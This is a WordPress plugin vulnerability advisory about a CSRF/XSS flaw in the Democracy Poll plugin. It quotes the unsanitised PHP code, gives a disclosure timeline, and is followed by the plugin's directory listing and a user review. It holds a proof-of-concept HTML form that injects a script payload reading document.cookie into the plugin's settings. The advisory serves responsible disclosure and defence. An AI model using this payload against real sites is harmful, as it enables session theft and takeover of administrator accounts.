# Cross-Site Request Forgery (CSRF)/Cross-Site Scripting (XSS) Vulnerability in Democracy Poll

As part of the feature of our service where we do [security reviews of plugins that are selected by our customers](https://www.pluginvulnerabilities.com/wordpress-plugin-security-reviews/), we recently [reviewed the plugin Democracy Poll](https://www.pluginvulnerabilities.com/2017/02/22/wordpress-plugin-security-review-democracy-poll/). The most serious issue we found in that review was a cross-site request forgery (CSRF)/cross-site scripting (XSS) vulnerability.

The CSRF potion of the vulnerability was due to a lack of a [nonce](https://codex.wordpress.org/WordPress_Nonces) on the Texts Changes tab of the plugin’s admin page and a lack of a check for a valid one when processing a request to change the plugin’s settings .

For the XSS issue, in the file /admin/class.DemAdminInit.php the function update\_l10n() saves the relevant settings and no sanitization is done in version 5.3.6:

| ``` 151 152 153 154 155 156 157 158 159 160  ``` | ``` function update_l10n(){ 	$new_l10n = stripslashes_deep( $_POST['l10n'] );   	// удалим, если нет отличия от оригинального перевода 	foreach( $new_l10n as $k => $v ) 		if( __( $k,'dem') == $v ) 			unset( $new_l10n[ $k ] );   	update_option('democracy_l10n', $new_l10n ); } ``` |
| --- | --- |

function update\_l10n(){
$new\_l10n = stripslashes\_deep( $\_POST['l10n'] );
// удалим, если нет отличия от оригинального перевода
foreach( $new\_l10n as $k => $v )
if( \_\_( $k,'dem') == $v )
unset( $new\_l10n[ $k ] );
update\_option('democracy\_l10n', $new\_l10n );
}

When the values are output they are not escaped, take for the example the value for “Vote”, in the file /democracy-poll/class.DemPoll.php it is output on line 384:

```
$vote_btn = '<a href="javascript:void(0);" class="dem-button '. Dem::$opt['btn_class'] .' dem-vote-link" data-dem-act="vote_screen" rel="nofollow">'. __dem('Vote') .'</a>';
```

The function that gets the value of “Vote” there \_\_dem() (in the file /democracy.php) does not escape it either:

| ``` 69 70 71 72 73 74 75  ``` | ``` function __dem( $str ){ 	static $cache; 	if( $cache === null ) 		$cache = get_option('democracy_l10n');   	return isset( $cache[ $str ] ) ? $cache[ $str ] : __( $str, 'dem'); } ``` |
| --- | --- |

function \_\_dem( $str ){
static $cache;
if( $cache === null )
$cache = get\_option('democracy\_l10n');
return isset( $cache[ $str ] ) ? $cache[ $str ] : \_\_( $str, 'dem');
}

We notified the developer of the issue and the rest of our review’s findings on February 8, but we haven’t heard back from them and no changes had been made to the plugin since then.

## Proof of Concept

The following proof of concept will cause an alert box with any accessible cookies to be shown on the page /wp-admin/options-general.php?page=democracy-poll&subpage=l10n and fronted pages with a poll on them, when submitted as an Administrator.

Make sure to replace “[path to WordPress]” with the location of WordPress.

```
<html>
<body>
<form action="http://[path to WordPress]/wp-admin/options-general.php?page=democracy-poll&subpage=l10n" method="POST">
<input type="hidden" name="l10n[Vote]" value='"><script>alert(document.cookie);</script>' />
<input type="submit" name="dem_save_l10n" value="Save Text" />
</form>
</body>
</html>
```
## Timeline

* February 8, 2017 – Developer notified.
* February 22, 2017 – WordPress.org Plugin Directory notified.
* February 23, 2017 – Version 5.4  submitted to Plugin Directory subversion repository, which fixes vulnerability.

# Democracy Poll

By [Kama](https://wp-kama.com/)

[Download](https://downloads.wordpress.org/plugin/democracy-poll.6.0.3.zip)

* [Details](https://wordpress.org/plugins/democracy-poll/#description)
* [Reviews](https://wordpress.org/plugins/democracy-poll/#reviews)
* [Development](https://wordpress.org/plugins/democracy-poll/#developers)

[Support](https://wordpress.org/support/plugin/democracy-poll/)

## Description

The plugin adds a clever and convenient system to create various Polls with different features, such as:

* Single and Multiple voting. Сustomizable.
* Visitors can add new answers. Сustomizable.
* Ability to set poll’s end date.
* Unregistered users can’t vote. Сustomizable.
* Different design of a poll.
* And so on. See changelog.

Democracy Poll works with all cache plugins like: WP Total Cache, WP Super Cache, WordFence, Quick Cache etc.

I focus on easy-admin features and fast performance. So we have:

* Quick Edit button for Admin, right above a poll
* Plugin menu in toolbar
* Inline css & js incuding
* Css & js connection only where it’s needed
* and so on. See changelog

### More Info

Democracy Poll is a reborn of once-has-been-famous plugin with the same name. Even if it hasn’t been updated since far-far away 2006, it still has the great idea of adding users’ own answers. So here’s a completely new code. I have left only the idea and great name of the original DP by Andrew Sutherland.

What can it perform?

* adding new polls;
* works with cache plugins: wp total cache, wp super cache, etc…
* users may add their own answers (Democracy), the option may be disabled if necessary;
* multi-voting: users may multiple answers instead of a single one (may be disabled on demand);
* closing the poll after the date specified beforehand;
* showing a random poll when some are available;
* closing polls for still unregistered users;
* a comfortable editing of a selected poll: ‘Edit’ key for administrators;
* votes amount editing;
* a user can change his opinion when re-vote option is enabled;
* remember users by their IP, cookies, WP profiles (for authorized users). The vote history may be cleaned up;
* inserting new polls to any posts: the [demоcracy] (shortcode). A key in visual editor is available for this function;
* a widget (may be disabled);
* convenient polls editing: the plugin’s Panel is carried out to the WordPress toolbar; (may be disabled);
* .css or .js files may be disabled or embedded to HTML code;
* showing a note under the poll: a short text with any notes to the poll or anything around it;
* changing the poll design (css themes);

Multisite: support from version 5.2.4

Requires PHP 5.3 or later.

It’s a great little plugin that does exactly what I need and is worth supporting. The trouble is just some errors:
(1) It returns a PHP error “Undefined array key ‘s'” located in democracy-poll/classes/Admin/List\_Table\_Polls.php:40; and
(2) More importantly, Wordfence classified it on 29 April 2024 (updated 7 May 2024) as having a critical security vulnerability. They write: “The Democracy Poll plugin for WordPress is vulnerable to unauthorized access due to a missing capability check on a function in all versions up to, and including, 6.0.3. This makes it possible for unauthenticated attackers to perform an unauthorized action.”
